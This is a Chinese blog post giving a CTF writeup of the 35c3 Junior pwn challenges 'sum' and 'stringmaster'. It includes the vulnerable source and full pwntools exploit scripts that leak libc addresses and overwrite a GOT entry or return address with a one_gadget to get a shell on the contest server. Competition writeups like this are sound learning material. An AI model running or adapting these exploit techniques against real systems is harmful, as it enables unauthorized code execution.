---
title: 35c3CTF-Junior 两/三道pwn writeup
date: 2018-12-31 11:53:43
tags: [pwn, ctf, "35c3 junior", writeup]
---
上周打了一下35c3。由于还要工作，所以只打了junior版。题目质量还是比较不错的，这里记录一下做出来的一组pwn以及一道pwn。
<!-- more -->
## sum
### 题目分析
本题逻辑很简单。一开始通过
```c
__isoc99_scanf("%zu", &nmemb)
```
读取想要分配的空间大小，然后读入操作指令。其中`set`指令是这样操作的
```c
if ( __isoc99_sscanf(lineptr, "set %zu %ld", &v21, &v22) == 2 )
    {
      if ( v21 >= nmemb )
        puts("Index out of bounds");
      else
        v0[v21] = v22; //v0 = nmemb
    }
```
### solution
可以发现，读入的是一个`unsigned __int64`，当calloc失败时会返回0，并且这题没有开PIE，因此可以任意地址读写。然后就随便做了。可以改scanf到system，我的做法烦了一点，因为是改到`onegadget`的，所以先跳了一下布置一下栈。
参考脚本如下：
```python
#! /usr/bin/env python2
# Author: 850
from pwn import *
import os
"""
pwn script framework
"""

class BASE(object):
    def __init__(self, remote_host, remote_port, local_elf, gdb_script, _remote_libc, _local_libc, _log_level):
        """
        initial basic paramaters
        """
        self.rhost = remote_host
        self.rport = remote_port
        self.elf_name = local_elf
        self.gdb_scripts = gdb_script
        self.local_libc = _local_libc
        self.remote_libc = _remote_libc
        context(os='linux', log_level=_log_level)
        context(terminal=["xfce4-terminal", "-e"])

    def local_debug(self, gdb_attach):
        """
        debug with GDB
        """
        self.target = process(self.elf_name)
        self.elf = ELF(self.elf_name)
        self.libc = ELF(self.local_libc)
        self.one_gadget = 0x45254
        if gdb_attach:
            gdb.attach(self.target, gdbscript=self.gdb_scripts)

    def remote_attack(self,):
        """
        remote exploit
        """
        self.libc = ELF(self.remote_libc)
        self.target = remote(self.rhost, self.rport)
        self.elf = ELF(self.elf_name)
        self.one_gadget = 0x10a38c
    
    def run(self,):
        # self.local_debug(gdb_attach=True)
        self.remote_attack()
        getline_addr = 0x602068 / 8
        self.target.sendlineafter("> ", '-1')
        self.target.recvuntil("[4] bye")
        self.target.recvuntil("[4] bye")
        self.target.sendlineafter("> ", 'get ' + str(getline_addr))
        real_getline_addr = int(self.target.recvline())
        self.target.recvuntil("[4] bye")
        
        real_onegadget_addr = real_getline_addr - self.libc.symbols['getline'] + self.one_gadget
        print hex(real_onegadget_addr)
        self.target.sendlineafter("> ", "set " + str(0x602058/8) + ' ' + str(real_onegadget_addr))

        self.target.sendlineafter("> ", "set " + str(getline_addr) + ' ' + str(0x400b73))
        self.target.interactive()


solve = BASE(
    remote_host="35.207.132.47",
    remote_port=22226,
    local_elf="./sum",
    _remote_libc="./libc-2.27.so",
    _local_libc="/lib64/libc.so.6",
    gdb_script="b *0x400ac3\nb*0x400a65",
    _log_level="info"
)
print solve.run()
```

## stringmaster1/2
### 题目描述
这题是一组题目，两道题的主逻辑是一样的，所以相当于是一道题。这题的逻辑也很简单。并且给了源码。通过源码并不能分析出什么问题。
```c
#include <iostream>
#include <cstdlib>
#include <ctime>
#include <vector>
#include <unistd.h>
#include <limits>


using namespace std;

const string chars = "abcdefghijklmnopqrstuvwxy";


void print_menu() {
    cout << endl;
    cout << "Enter the command you want to execute:" << endl;
    cout << "[1] swap <index1> <index2>                   (Cost: 1)" << endl;
    cout << "[2] replace <char1> <char2>                  (Cost: 1)" << endl;
    cout << "[3] print                                    (Cost: 1)" << endl;
    cout << "[4] quit                                              " << endl;
    cout << "> ";
}

void play() {
    string from(10, '\00');
    string to(10, '\00');
    for (int i = 0; i < 10; ++i) {
        from[i] = chars[rand() % (chars.length() - 1)];
        to[i] = chars[rand() % (chars.length() - 1)];
    }


    cout << "Perform the following operations on String1 to generate String2 with minimum costs." << endl << endl;
    cout << "[1] swap <index1> <index2>                   (Cost: 1)" << endl;
    cout << "    Swaps the char at index1 with the char at index2  " << endl;
    cout << "[2] replace <char1> <char2>                  (Cost: 1)" << endl;
    cout << "    Replaces the first occurence of char1 with char2  " << endl;
    cout << "[3] print                                    (Cost: 1)" << endl;
    cout << "    Prints the current version of the string          " << endl;
    cout << "[4] quit                                              " << endl;
    cout << "    Give up and leave the game                        " << endl;
    cout << endl;
    cout << "String1: " << from << endl;
    cout << "String2: " << to << endl;
    cout << endl;
        
    unsigned int costs = 0; 
    string s(from);

    while (true) {
        print_menu();

        string command;
        cin >> command;

        if (command == "swap") {
            unsigned int i1, i2;
            cin >> i1 >> i2;
            if (cin.good() && i1 < s.length() && i2 < s.length()) {
                swap(s[i1], s[i2]);
            }
            costs += 1;
        } else if (command == "replace") {
            char c1, c2;
            cin >> c1 >> c2;
            auto index = s.find(c1);
            cout << c1 << c2 << index << endl;
            if (index >= 0) {
                s[index] = c2;
            }
            costs += 1;
        } else if (command == "print") {
            cout << s << endl;
            costs += 1;
        } else if (command == "quit") {
            cout << "You lost." << endl;
            break;
        } else {
            cout << "Invalid command" << endl;
        }

        if (!cin) {
            cin.clear();
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
        }
        if (!cout) {
            cout.clear();
        }

        if (s == to) {
            cout << s.length() << endl;
            cout << endl;
            cout << "****************************************" << endl;
            cout << "* Congratulations                       " << endl;
            cout << "* You solved the problem with cost: " << costs << endl;
            cout << "****************************************" << endl;
            cout << endl;
            break;
        }
    }
}




int main() {
    srand(time(nullptr));

    play();
}
```
但是，我自己瞎搞瞎搞的时候发现，如果`replace`一个不存在的值，然后在`print`，会造成leak出栈上的东西。同时，这时候也能换本来不能换的值了。所以计算一下偏移就能做到任意地址写了。还有一个坑的点是，本地`leak`出的`__libc_start_main`比远程要多12，减去就好了。不过为什么会出现这种情况还没有弄清楚，还需要更加深入的研究。
参考脚本如下：
```python
#! /usr/bin/env python2
# Author: 850
from pwn import *
import os
"""
pwn script framework
"""

class BASE(object):
    def __init__(self, remote_host, remote_port, local_elf, gdb_script, _remote_libc, _local_libc, _log_level):
        """
        initial basic paramaters
        """
        self.rhost = remote_host
        self.rport = remote_port
        self.elf_name = local_elf
        self.gdb_scripts = gdb_script
        self.local_libc = _local_libc
        self.remote_libc = _remote_libc
        context(os='linux', log_level=_log_level)
        context(terminal=["xfce4-terminal", "-e"])

    def local_debug(self, gdb_attach):
        """
        debug with GDB
        """
        self.target = process(self.elf_name)
        self.elf = ELF(self.elf_name)
        self.libc = ELF(self.local_libc)
        self.one_gadget = 0x45254
        if gdb_attach:
            gdb.attach(self.target, gdbscript=self.gdb_scripts)

    def remote_attack(self,):
        """
        remote exploit
        """
        self.libc = ELF(self.remote_libc)
        self.target = remote(self.rhost, self.rport)
        self.elf = ELF(self.elf_name)
        self.one_gadget = 0x10a38c
    
    def run(self,):
        # self.local_debug(gdb_attach=False)
        self.remote_attack()
        self.target.recvuntil("[4] quit")
        self.target.recvuntil("[4] quit")
        self.target.sendlineafter("> ", "replace " + '\x00' + " 2")
        self.target.sendlineafter("> ", "print")
        for _ in xrange(4):
            self.target.recvuntil("> ")
        raw_data = self.target.recvuntil("Enter the command you want to execute:")[:-len("Enter the command you want to execute:")]
        base_string = raw_data[:10]
        raw_data =raw_data[16:]
        data_units = []
        for i in xrange(len(raw_data)/8):
            data_units.append(u64(raw_data[i*8:i*8+8]))
        # self.target.sendlineafter("> ", "swap " + '0 ' + str(0x79))

        print base_string
        programme_base_addr = data_units[13] - 0x25fb
        libc_start_main_addr = data_units[15] - 243 + 12 
        # I don't know why but remote program doesn't have the same offset as local program

        libc_base_addr = libc_start_main_addr - self.libc.symbols['__libc_start_main']
        print hex(programme_base_addr)
        print hex(libc_base_addr)
        target_addr = p64(libc_base_addr + self.one_gadget)
        for i in xrange(8):
            self.target.sendlineafter("> ", "replace " + base_string[i] + ' ' + target_addr[i])
        # self.target.sendlineafter("> ", "print")
        for i in xrange(8):
            self.target.sendlineafter("> ", "swap " + str(i) + ' ' + str(0x78 + i))
        self.target.sendlineafter("> ", "quit")
        self.target.interactive()
        return "done"

solve = BASE(
    remote_host="35.207.132.47",
    remote_port=22225,
    local_elf="./stringmaster2",
    _remote_libc="./libc-2.27.so",
    _local_libc="/lib64/libc.so.6",
    gdb_script="",
    _log_level="info"
)
print solve.run()
```

## 感想
这次比赛比较仓促，一边上班一边打，第一天的5个pwn很简单，后来两个pwn到现在也不知道咋做。自己的水平还有待提高。不管怎么说，这是2018打的最后一个比赛了。希望在2019年变得更强，祝大家2019，好事不断！